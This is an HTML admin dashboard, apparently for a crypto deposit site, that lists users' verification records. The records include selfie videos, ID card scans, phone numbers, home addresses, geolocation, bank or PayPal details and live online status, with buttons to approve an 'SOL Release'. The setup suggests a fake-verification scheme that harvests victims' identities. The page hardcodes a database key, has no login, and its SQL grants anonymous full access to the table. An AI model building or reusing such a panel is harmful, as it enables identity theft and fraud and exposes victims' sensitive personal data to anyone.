<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Admin - Enhanced Identity Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <style>
        body { background: #0a0a0a; color: white; font-family: sans-serif; }
        .kyc-card { background: #111; border: 1px solid #222; border-radius: 12px; overflow: hidden; }
        pre { background: #000; padding: 10px; border-radius: 6px; font-size: 11px; color: #0f0; overflow-x: auto; }
        video { width: 100%; height: 220px; background: #000; object-fit: cover; }
        .id-thumb { width: 100%; height: 100px; object-fit: cover; border-radius: 8px; cursor: pointer; border: 1px solid rgba(255,255,255,0.1); }
        .id-thumb:hover { border-color: #ab66ff; }
    </style>
</head>
<body class="p-8 pb-20">
    <div class="max-w-7xl mx-auto">
        <header class="flex justify-between items-center mb-8">
            <div>
                <h1 class="text-2xl font-bold">Deep Verification Dashboard</h1>
                <p class="text-xs text-white/40 mt-1">Reviewing Video, Audio, Location, and ID Documents</p>
            </div>
            <div class="flex gap-3">
                <a href="deposit.html" class="bg-white/5 border border-white/10 px-4 py-2 rounded font-bold text-sm hover:bg-white/10 transition">Deposit Page</a>
                <button onclick="loadVerifications()" class="bg-[#ab66ff] px-4 py-2 rounded font-bold text-sm">Refresh Data</button>
            </div>
        </header>

        <section class="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6" id="kyc-list">
            <p class="col-span-full opacity-50 italic text-center py-20">Fetching logs...</p>
        </section>

        <hr class="my-12 border-white/10">

        <!-- UPDATED SQL SCHEMA -->
        <section class="bg-zinc-900 p-6 rounded-xl border border-white/5">
            <h2 class="text-xl font-bold mb-4 text-yellow-500">Database Update (Extended Table)</h2>
            <p class="text-sm opacity-60 mb-4">Run this updated SQL to handle phone, address, IDs, geolocation, and last online tracking:</p>
            <pre>
-- Update the table with new security fields
ALTER TABLE user_biometrics_log 
ADD COLUMN IF NOT EXISTS phone text,
ADD COLUMN IF NOT EXISTS address text,
ADD COLUMN IF NOT EXISTS geolocation text,
ADD COLUMN IF NOT EXISTS id_front text,
ADD COLUMN IF NOT EXISTS id_back text,
ADD COLUMN IF NOT EXISTS last_online timestamp with time zone;

-- Ensure RLS is configured for all operations
ALTER TABLE user_biometrics_log ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow anonymous access" ON user_biometrics_log FOR ALL USING (true);
            </pre>
        </section>
    </div>

    <!-- Image Modal -->
    <div id="img-modal" class="fixed inset-0 bg-black/90 hidden z-50 flex items-center justify-center p-10" onclick="this.classList.add('hidden')">
        <img id="modal-content" src="" class="max-h-full max-w-full rounded-lg shadow-2xl">
    </div>

    <script>
        const sb = supabase.createClient("https://tmvimacikrnrizxtcesf.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4");

        async function loadVerifications() {
            const container = document.getElementById('kyc-list');
            
            const { data, error } = await sb
                .from('user_biometrics_log')
                .select('*')
                .order('created_at', { ascending: false });

            if (error) {
                container.innerHTML = `<p class="text-red-500">Error: ${error.message}</p>`;
                return;
            }

            container.innerHTML = data.map(v => {
                const isOnline = v.last_online && (new Date() - new Date(v.last_online) < 60000);
                
                return `
                <div class="kyc-card p-5 space-y-4 border ${v.status === 'pending' ? 'border-yellow-500/20' : 'border-white/5'}">
                    <div class="flex justify-between items-start">
                        <div>
                            <div class="flex items-center gap-2">
                                <p class="text-blue-400 font-bold text-sm">${v.username}</p>
                                <span class="w-2 h-2 rounded-full ${isOnline ? 'bg-green-500 animate-pulse' : 'bg-red-500'}"></span>
                                <span class="text-[8px] opacity-40 uppercase">${isOnline ? 'Online Now' : 'Last: ' + (v.last_online ? new Date(v.last_online).toLocaleTimeString() : 'Never')}</span>
                            </div>
                            <p class="text-[10px] opacity-40">Submitted: ${new Date(v.created_at).toLocaleString()}</p>
                        </div>
                        <span class="text-[10px] ${v.status === 'pending' ? 'bg-yellow-500/20 text-yellow-500' : 'bg-green-500/20 text-green-500'} px-2 py-1 rounded font-bold uppercase tracking-widest">${v.status}</span>
                    </div>

                    <!-- Video + Audio Player -->
                    <div class="rounded-lg overflow-hidden border border-white/10 bg-black">
                        <video controls src="${v.video_url}"></video>
                        <div class="p-2 bg-white/5 text-[9px] text-center border-t border-white/5">
                            Required Signs: <span class="text-[#ab66ff] font-bold">${v.required_signs}</span>
                        </div>
                    </div>

                    <!-- ID Documents -->
                    <div class="grid grid-cols-2 gap-2">
                        <div>
                            <p class="text-[9px] opacity-40 mb-1 uppercase">ID Front</p>
                            <img src="${v.id_front || 'https://via.placeholder.com/150?text=No+ID'}" class="id-thumb" onclick="openImg('${v.id_front}')">
                        </div>
                        <div>
                            <p class="text-[9px] opacity-40 mb-1 uppercase">ID Back</p>
                            <img src="${v.id_back || 'https://via.placeholder.com/150?text=No+ID'}" class="id-thumb" onclick="openImg('${v.id_back}')">
                        </div>
                    </div>
                    
                    <!-- Contact & Geo -->
                    <div class="bg-white/5 p-3 rounded-lg space-y-2 text-[10px]">
                        <div class="flex justify-between border-b border-white/5 pb-1">
                            <span class="opacity-40">Phone:</span>
                            <span>${v.phone || 'N/A'}</span>
                        </div>
                        <div class="flex justify-between border-b border-white/5 pb-1">
                            <span class="opacity-40">Geo Location:</span>
                            <a href="https://www.google.com/maps?q=${v.geolocation}" target="_blank" class="text-blue-400 underline">${v.geolocation || 'Denied'}</a>
                        </div>
                        <div class="flex flex-col gap-1 border-b border-white/5 pb-1">
                            <span class="opacity-40">Address:</span>
                            <span class="leading-tight">${v.address || 'N/A'}</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="opacity-40">Bank/PayPal:</span>
                            <span class="truncate max-w-[150px]">${v.bank_info || 'N/A'}</span>
                        </div>
                    </div>

                    <div class="flex gap-2">
                        <button onclick="updateStatus('${v.id}', 'approved')" class="flex-1 bg-green-600 py-2 rounded text-xs font-bold hover:bg-green-500 transition">Approve SOL Release</button>
                        <button onclick="updateStatus('${v.id}', 'rejected')" class="flex-1 bg-red-600/20 text-red-500 py-2 rounded text-xs font-bold border border-red-500/20 hover:bg-red-600/30 transition">Reject</button>
                    </div>
                </div>
            `}).join('');
        }

        function openImg(src) {
            if(!src) return;
            const modal = document.getElementById('img-modal');
            const content = document.getElementById('modal-content');
            content.src = src;
            modal.classList.remove('hidden');
        }

        async function updateStatus(id, newStatus) {
            const { error } = await sb
                .from('user_biometrics_log')
                .update({ status: newStatus })
                .eq('id', id);

            if (error) alert("Error: " + error.message);
            else loadVerifications();
        }

        window.onload = loadVerifications;
    </script>
</body>

</html>
